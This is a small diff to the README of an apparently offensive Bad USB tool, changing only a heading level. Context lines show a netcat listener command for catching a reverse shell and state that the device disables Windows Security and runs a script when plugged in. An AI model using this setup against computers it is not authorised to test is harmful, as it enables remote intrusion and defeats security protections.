@@ -39,7 +39,7 @@ You will want to fill in the `IP-ADDRESS-HERE` and `PORT-HERE` with the port of 
 ```stty raw -echo; (stty size; cat) | nc -lvnp PORT-HERE```
 And replace the `PORT-HERE` with the port of your choice
 
-# Usage
+## Usage
 Take the Bad USB and plug it into a computer you own while the `Linux server` is listening,
 It will disable `Windows Security` temporarily and execute the script quickly.
 
